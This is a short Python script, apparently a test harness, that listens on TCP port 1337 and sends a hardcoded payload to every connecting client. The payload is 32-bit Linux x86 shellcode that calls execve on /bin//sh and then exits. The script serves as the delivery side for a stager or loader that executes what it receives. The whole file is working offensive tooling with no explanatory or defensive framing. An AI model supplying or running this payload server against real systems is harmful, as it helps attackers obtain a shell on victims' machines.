import socket
import time


if __name__ == '__main__':
	TCP_IP = '0.0.0.0'
	TCP_PORT = 1337
	
	shellcode_to_test = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.bind((TCP_IP, TCP_PORT))
	s.listen(1)

	while True:
		try:
			client, addr = s.accept()
			print('Client connected: {}'.format(addr))
			client.send(shellcode_to_test)
			client.close()
		except KeyboardInterrupt:
			break

